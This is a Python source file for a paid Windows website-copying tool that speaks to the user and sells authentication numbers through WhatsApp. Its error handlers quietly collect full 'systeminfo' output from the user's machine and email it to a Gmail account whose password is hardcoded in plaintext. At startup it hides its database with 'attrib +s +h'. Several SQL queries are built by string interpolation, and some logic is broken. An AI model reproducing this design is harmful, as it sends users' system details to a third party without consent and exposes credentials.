import smtplib
import time
import requests
import urllib.parse
from bs4 import BeautifulSoup
import sqlite3
import os
import subprocess
import uuid
from cryptography.fernet import Fernet
import random
import colorama
import sys
import pyttsx3
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

init = 20
engine = pyttsx3.init()
engine. setProperty("rate", 178)
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[1].id)

def speak(text):
  try:
    engine.say(text)
    engine.runAndWait()
  except Exception as e:
    print('This program might not work well')
    progess_print('please wait while i send the error to the admin')
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    mail_file = 'error.txt'
    for item in Id:
      new.append(str(item.split("\r")[:-1]))
    for i in new:
      with open(mail_file, 'a') as mf:
        mf.write(i[2:-2])
    send_error(e)
    pass

def talk(text):
  try:
    engine.say(text)
    engine.runAndWait()
  except Exception as e:
    print('This program might not work well')
    progess_print('please wait while i send the error to the admin')
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    mail_file = 'error.txt'
    for item in Id:
      new.append(str(item.split("\r")[:-1]))
    for i in new:
      with open(mail_file, 'a') as mf:
        mf = open(mail_file, 'a')
        mf.write(i[2:-2])
    send_error(e)
    mf.close()
    os.remove('error.txt')

def pletter(value, times=1, ends='\n', seps=''):
    for i in value:
        sys.stdout.write(colorama.Fore.RED +i+seps)
        sys.stdout.flush()
        time.sleep(times)
    sys.stdout.write(ends)
    print(colorama.Fore.RESET)

def send_error(error):
  try:
    keys = f"""
               {error}
              """
    message = MIMEMultipart()
    message['From'] = 'code_scrapper'
    message['to'] = 'malwarefinder3@gmail.com'
    message['subject'] = 'Error'
    message.attach(MIMEText(keys, 'plain'))
    attach_file_name = 'error.txt'
    attach_file = open(attach_file_name, 'r')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    text = message.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(user='malwarefinder3@gmail.com', password='3101331013')
    server.sendmail('malwarefinder3@gmail.com', 'malwarefinder3@gmail.com', msg = text)
    server.quit()
  except KeyboardInterrupt:
    print("unable to give admin feedback for ammendment")
  
def send_mail(key, id, confirm):
  try:
    keys = f"""
          app name                ==> code_scrapper
          auth id                 ==> {id}
          authenication number    ==> {key}
          authentication verified ==> {confirm}
    """
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(user='malwarefinder3@gmail.com', password='3101331013')
    server.sendmail('malwarefinder3@gmail.com', 'malwarefinder3@gmail.com', msg = keys)
    server.quit()
    return True
  except KeyboardInterrupt:
    danger_print("\n\n[-] terminating...")
    deletet()
    exit()
  except:
    return False

def unique():
  chc = random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=5)
  schc = ''.join(chc)
  return schc

def special():
  ran = random.randint(111111111, 999999999)
  chc = random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=5)
  ran = str(ran)
  schc = ''.join(chc)
  return ran + schc

def generate():
  key = Fernet.generate_key()
  key = key.decode()
  key = 'yembot-' + key
  return key

def password(key):
  key = uuid.uuid5(uuid.NAMESPACE_DNS, key)
  key = key.hex
  key = uuid.UUID(key)
  key = key.bytes_le
  return key
  
def create_table():
  try:
    c.execute("CREATE TABLE auther (passer text, valid text, count text, confirm text)")
    c.execute("CREATE TABLE fresh (count integer)")
    c.execute("CREATE TABLE used (count integer)")
    c.execute("CREATE TABLE free (count integer)")
    conn.commit()
  except sqlite3.OperationalError:
    pass
  except Exception as e:
    print('This program might not work well')
    progess_print('please wait while i send the error to the admin')
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    mail_file = 'error.txt'
    for item in Id:
      new.append(str(item.split("\r")[:-1]))
    for i in new:
      with open(mail_file, 'a') as mf:
        mf = open(mail_file, 'a')
        mf.write(i[2:-2])
    send_error(e)
    mf.close()
    os.remove('error.txt')

def auther_insert(passer, valid, count, confirm):
  value = (passer, valid, count, confirm)
  c.execute("INSERT INTO auther VALUES (?,?,?,?)", value)
  conn.commit()
def fresh_insert(count):
  value = int(count)
  c.execute(f"INSERT INTO fresh VALUES ({value})")
  conn.commit()
def used_insert(count):
  value = int(count)
  c.execute(f"INSERT INTO used VALUES ({value})")
  conn.commit()
def free_insert(count):
  value = int(count)
  c.execute(f"INSERT INTO free VALUES ({value})")
  conn.commit()

def update(table, counts):
  c.execute(f"UPDATE {table} SET count = {int(counts)} WHERE rowid = 1")
  conn.commit()
def updateauth(valid):
  c.execute(f"UPDATE auther SET valid = '{valid}' WHERE rowid = 1")
def fetch(table):
  c.execute(f"SELECT * FROM {table} Where rowid = 1")
  # val = 'none' if c.fetchall() == [] else c.fetchall()[0][0]
  try:
    return c.fetchall()[0][0]
  except:
    return 'none'
def trial():
  fresh = fetch('fresh')
  used = fetch('used')
  free = fetch('free')

  rem = fresh - used
  return rem
def passfetch():
  query = f"SELECT * FROM auther where rowid = 1"
  c.execute(query)
  conn.commit()
  try:
    return c.fetchall()[0][0]
  except:
    return 'none'
def validfetch():
  query = f"SELECT * FROM auther where rowid = 1"
  c.execute(query)
  conn.commit()
  try:
    return c.fetchall()[0][1]
  except:
    return 'none'
def countfetch():
  query = f"SELECT * FROM auther where rowid = 1"
  c.execute(query)
  conn.commit()
  try:
    return c.fetchall()[0][2]
  except:
    return 'none'
def confirmfetch():
  query = f"SELECT * FROM auther where rowid = 1"
  c.execute(query)
  conn.commit()
  try:
    return c.fetchall()[0][3]
  except:
    return 'none'

def banner():
  try:
    os.system("clear")
    danger_print("""
  Scaping for Windows v0.0.2
  (built: may 24 2022 14:12:27)
  (last upgrade: may 29 2022 11:03:30)

    """)

    talk("Scaping is illegal. Usage of this tools for hacking targets without prior mutual written consent is illegal and punishable by law. It's the end user's responsibility to obey all applicable laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Press Enter key to Continue only if you AGREE to the above DISCLAIMER.")

    danger_print("""
                                DISCLAIMER
    """)                                    
    pletter(value = """    
          Scaping is illegal. Usage of this tools for hacking targets without prior mutual written consent is illegal and punishable by law. 
          It's the end user's responsibility to obey all applicable laws. 
          Developers assume no liability and are not responsible for any misuse or damage caused by this program.

   """, times=0.07)
    success_print('Press Enter key to Continue only if you AGREE to the above DISCLAIMER.\n')
    ans = input("[+] input exit to Exit/close or press Enter to continue: ").lower()
    if ans == "exit":
      os.system('clear')
      exit()
    success_print('[✔] ok')
    os.system("clear")
  except KeyboardInterrupt:
    danger_print("\n\n[-] terminating...")
    exit()

def contact():
  try:
    val = trial()
    os.system("clear")
    primary_print("""
                      __________________________________________
                                  HTML & CSS SCAPER                 
                      ------------------------------------------
                      + builded by: Adekojo Adeyemi (yembot)
                      + country: nigeria
                      + state: lagos
                      + contact me via whatsapp: +2347084375332
                      _____________________________________________
    """)
    fresh = fetch('fresh')
    used = int(fetch('used'))
    if fresh == init and used == 0:
      talk("sorry for not introducing my self at first")
      talk("i hope you forgive me for my rudeness")
      talk("i am the bot that go into the internet to scape out all the codes")
      talk("All i need is food, for energy")
      talk(f"you have {str(init)} free food from my master to test me out first")
    pletter(value = f"""
      this project is not perfect yet so if you find any bug you can contact me via whatsapp only. you still have {str(val)} food left.   
    """, times=0.07)

    ans = input("Press Enter to contiune or exit to cancel: ")
    if ans == "exit":
      os.system('clear')
      exit()
    pletter(f"""
      You are about to use out of your remaining {str(val)} food and it is not refundable when i eat it   
    """, times=0.08)
    talk(f"You are about to use out of your remaining {str(val)} food left, and it is not refundable when i eat it. Press Enter Key to confirm")
    success_print("Press Enter to confirm")
    input()
  except KeyboardInterrupt:
    danger_print("\n\n[-] terminating...")
    exit()
def code():
  talk("now that i have eaten, let get to work")
  try:
    vals = fetch('used') + 1
    vari = fetch('free') - 1
    update('free', vari)
    update('used', vals)
    print("let go scape some website")
    user_url = str(input("[+] Enter Target URL To Scan: "))
    folder = str(input("[+] Enter folder to put the files: "))
    if folder == '' or folder == ' ' or folder == '\n':
      danger_print("[-] folder name can't be empty")
      talk("sorry unable to complete your task, I have eaten your food. so it can't be refunable")
      code()
    elif os.path.exists(folder):
      danger_print("[-] folder already existed")
      talk("sorry unable to complete your task, I have eaten your food. so it can't be refunable")
      code()
    os.mkdir(folder)
    css_urls = []
    script_urls = []

    parts = urllib.parse.urlsplit(user_url)
    base_url = '{0.scheme}://{0.netloc}'.format(parts)

    path = user_url[:user_url.rfind('/')+1] if '/' in parts.path else user_url

    try:
      talk("please wait while i grab that url and makes some request")
      session = requests.Session()
      session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
      response = session.get(user_url)
      talk("wow the website is alive, let scape something")
      progess_print('\ninitialing...')
      soup = BeautifulSoup(response.text, features="lxml")
      talk("trying to scape out some css files")
      progess_print('\ncss file scaping...\n')
      if len(soup.find_all("link")) > 0:
        progress_bar(0, len(soup.find_all("link")))
        for index, links in enumerate(soup.find_all("link")):
            progress_bar(index+1, len(soup.find_all("link")))
            link = links.attrs['href'] if 'href' in links.attrs else ''
            if link.startswith('/'):
              link = base_url + link
            elif not link.startswith('http'):
              link = path + link
            if not link in css_urls and link.startswith(base_url):
              if not link.endswith('/'):
                css_urls.append(link)

        print(colorama.Fore.RESET)

      talk("trying to scape out some javascript files")
      progess_print('\njavascript file scaping...\n')
      if len(soup.find_all("script")) > 0:
        progress_bar(0, len(soup.find_all("script")))
        for index, links in enumerate(soup.find_all("link")):
            progress_bar(index+1, len(soup.find_all("link")))
            link = links.attrs['href'] if 'href' in links.attrs else ''
            if link.startswith('/'):
              link = base_url + link
            elif not link.startswith('http'):
              link = path + link
            if not link in script_urls and link.startswith(base_url):
              if not link.endswith('/'):
                script_urls.append(link)

        print(colorama.Fore.RESET)
      filenames = folder + "/index.html"
      os.makedirs(os.path.dirname(filenames), exist_ok=True)
      with open(filenames, "w", encoding="utf-8") as f:
        html = soup.prettify()
        f.write(html)
    except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
      os.system("clear")
      danger_print("""
                    Fatai Error \n\n
       """)
      print("solution: ")
      progess_print('1) Check your internet connection\n')
      progess_print('2) check if the url you provided is invalid')
      success_print("""
      _____________________________________
                    Examples:
      _____________________________________
            https://www.example.com
            http://www.example.com
            https://www.example.com/path
            http://www.example.com/path
      --------------------------------------
      ______________________________________
      """)
      talk("sorry unable to complete your task due to simple, I have eaten your food. so it can't be refunable")
      talk("if after trying the above solutions, please contact my master")

      code()
    if len(css_urls) > 0:
      talk("yeah!!!, i found some css files to scape")
      try:
        talk("let me store it into a some files")
        print('\norganizing css files...\n')
        progress_bar(0, len(css_urls))
        for index, i in enumerate(css_urls):
          progress_bar(index + 1, len(css_urls))
          parts = urllib.parse.urlsplit(i)

          path = i[:i.rfind('/')+1] if '/' in parts.path else i

          try:
              session = requests.Session()
              session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
              response = session.get(i)
              soup = BeautifulSoup(response.text, features="lxml")

              filenames = folder+"/"+parts.path
              os.makedirs(os.path.dirname(filenames), exist_ok=True)
              try:
                with open(filenames, "wb") as f:
                  f.write(response.content)
              except TypeError:
                try:
                  with open(filenames, "w") as f:
                    f.write(response.content)
                except UnicodeEncodeError:
                  with open(filenames, "w", encoding="utf-8") as f:
                    html = soup.prettify()
                    f.write(html)
          except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
            pass
        print(colorama.Fore.RESET)
        success_print(f'done scaping {user_url} css files')
      except KeyboardInterrupt:
        danger_print('[-] Closing...')
    else:
      primary_print('[-] no css file found to scape')
      talk("oh no unable to find some css file to scape")
      talk("because the target website use CDN")
      print("because the target website use CDN")

    if len(script_urls) > 0:
      try:
        print('\norganizing javascript files...\n')
        progress_bar(0, len(script_urls))
        for index, i in enumerate(script_urls):
          progress_bar(index + 1, len(script_urls))
          parts = urllib.parse.urlsplit(i)

          path = i[:i.rfind('/')+1] if '/' in parts.path else i

          try:
              session = requests.Session()
              session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
              response = session.get(i)
              soup = BeautifulSoup(response.text, features="lxml")

              filenames = folder+"/"+parts.path
              os.makedirs(os.path.dirname(filenames), exist_ok=True)
              try:
                with open(filenames, "wb") as f:
                  f.write(response.content)
              except TypeError:
                try:
                  with open(filenames, "w") as f:
                    f.write(response.content)
                except UnicodeEncodeError:
                  with open(filenames, "w", encoding="utf-8") as f:
                    html = soup.prettify()
                    f.write(html)
          except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
            pass
        print(colorama.Fore.RESET)
        success_print(f'done scaping {user_url} javascript files')
      except KeyboardInterrupt:
        danger_print('[-] Closing...')
    else:
      primary_print('[-] no javascript file found to scape')
      talk("oh no unable to find some javascript file to scape")
      talk("because the target website use CDN")
      print("because the target website use CDN")
    
    success_print(f'scaped files are store in {os.getcwd()}\{folder}')
    talk("my scaping didn't look perfect to me")
    pletter(value = "oh, that was really a great work. my scaping didn't look perfect to me", times=0.7)
    talk("i guess you could find a good file")
    pletter(value = "i guess you could find a good file", times=0.07)
    pletter(value = "please wait while I grab some coffees in a cafe website", times=0.07)
    talk('please wait while I grab some coffees in a cafe website')
    primary_print('[‼] please wait while I grab some coffees...')
    time.sleep(10)
    talk("thanks for waiting")

  except KeyboardInterrupt:
    danger_print("\n\n[-] terminating...")
    exit()
  
  except Exception as e:
    print('This program might not work well')
    progess_print('please wait while i send the error to the admin')
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    mail_file = 'error.txt'
    for item in Id:
      new.append(str(item.split("\r")[:-1]))
    for i in new:
      with open(mail_file, 'a') as mf:
        mf = open(mail_file, 'a')
        mf.write(i[2:-2])
    send_error(e)
    mf.close()
    os.remove('error.txt')

def success_print(value):
  print(colorama.Fore.GREEN + value)
  print(colorama.Fore.RESET)
def danger_print(value):
  print(colorama.Fore.RED + value)
  print(colorama.Fore.RESET)
def primary_print(value):
  print(colorama.Fore.BLUE + value)
  print(colorama.Fore.RESET)
def progess_print(value):
  print(colorama.Fore.YELLOW + value)
  print(colorama.Fore.RESET)
def deletet():
  query = "DELETE FROM auther WHERE rowid = 1"
  c.execute(query)
  conn.commit()
def validate(key):
  passers = passfetch()
  pascal = password(key)
  if pascal == passers:
    return True
  else:
    return False

def confirm():
  danger_print("[❌] you trial has expired, you have use up your trial")
  print("[+] contact +2347084375332 via whatsapp to purchase your authentication number")
  talk("you trial has expired, you have use up your trial, if you love me, please contact my master via whatsapp to purchase your authentication number")
  talk("because i can't coutinue without it")
  valid = validfetch()
  counters = countfetch()
  passers = passfetch()
  confirm = confirmfetch()
  if passers == 'none':
    keyer = generate()
    key = password(keyer)
    valid = 'false'
    counters = special()
    confirm = unique()
    auther_insert(key, valid, counters, confirm)
    passers = passfetch()
    counters = countfetch()
    valid = validfetch()
    confirm = confirmfetch()
    if send_mail(keyer, counters, confirm):
      pass
    else:
      danger_print("""
        _________________________________________
                  FATAI ERROR              
                ---------------------
        solution:
        1) Check your connection

        if after you fixed your internet, contact +2347084375332
        via whatsapp. Thanks for your understanding.

      """)
      talk("There is no internet for me to connect to the server")
      deletet()
      danger_print("terminating the program...")
      time.sleep(10)
      exit()
  while valid == 'false':
    success_print("[**] your payment id is %s" % (counters))
    print("[**] contact +2347084375332 via whatsapp to purchase your authentication number")
    auth = input("[🔑] Enter the authentication number you purchased: ")
    progess_print('[🔂] confirming crediential...')
    if auth == confirm:
      success_print('[✔] verified: that is your authentication')
      continue
    elif validate(auth):
      success_print('[✔] validated')
      update('fresh', 50)
      update('used', 0)
      update('free', 50)
      updateauth('true')
      success_print('[✔] confirmed')
      talk("thanks for buying me food, i really appreciate it sir")
      valid = validfetch()
    elif auth == '\n' or auth == '' or auth == ' ':
      danger_print('[-] input is mandatory')
      continue
    else:
      print('\n' + auth + ' is invalid\n')
      danger_print('[x] Wrong authentication number')
      talk('oh sorry, that was a Wrong authentication number you provided')
      continue
  if valid == 'true':
    progess_print('[⚙] Redirecting...')
    deletet()
    os.system('clear')
    start()
  else:
    os.system("clear")
    exit()

def progress_bar(progress, total, color=colorama.Fore.YELLOW):
  percent = 100 * (progress/float(total))
  bar = '*' * int(percent) + '-' * (100 - int(percent))
  print(color + f"\r|{bar}| {percent:.2f}%", end="\r")
  if progress == total:
    print(colorama.Fore.GREEN + f"\r|{bar}| {percent:.2f}%", end="\r")

def start():
  progess_print('[**] starting...')
  fresh = fetch('fresh')
  valy = fetch('used')
  vary = fetch('free')
  if fresh == 'none':
    fresh_insert(init)
    fresh = int(fetch('fresh'))
  if valy == 'none':
    used_insert(0)
    valy = int(fetch('used'))
  if vary == 'none':
    free_insert(init)
    vary = int(fetch('free'))
  success_print('[**] preparing...')
  while True:
    try:
      fresh = int(fetch('fresh'))
      valy = int(fetch('used'))
      vary = int(fetch('free'))
      if fresh >= valy and vary >= 0:
        success_print('[**] approving...')
        contact()
        code()
        os.system('clear')
      else:
        confirm()
    except KeyboardInterrupt:
      danger_print('\n [-] terminating program')
      os.system('clear')
      exit()

try:
  os.system("clear")
  path = os.path.join(os.path.expanduser("~"), 'AppData\\Local\\task.db')
  #create database
  primary_print('[**] connecting...')
  conn = sqlite3.connect(path)
  success_print('[**] processing...')
  # hid database
  command = "attrib +s +h " + path
  execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  c = conn.cursor()
  primary_print('[**] checking...')
  create_table()
  success_print('[**] verifying...')

  banner()
  start()
except KeyboardInterrupt:
  danger_print("\n \n[-]terminating...")
  time.sleep(5)
  exit()

except Exception as e:
    print('This program might not work well')
    progess_print('please wait while i send the error to the admin')
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    mail_file = 'error.txt'
    for item in Id:
      new.append(str(item.split("\r")[:-1]))
    for i in new:
      with open(mail_file, 'a') as mf:
        mf = open(mail_file, 'a')
        mf.write(i[2:-2])
    send_error(e)
    mf.close()
    os.remove('error.txt')
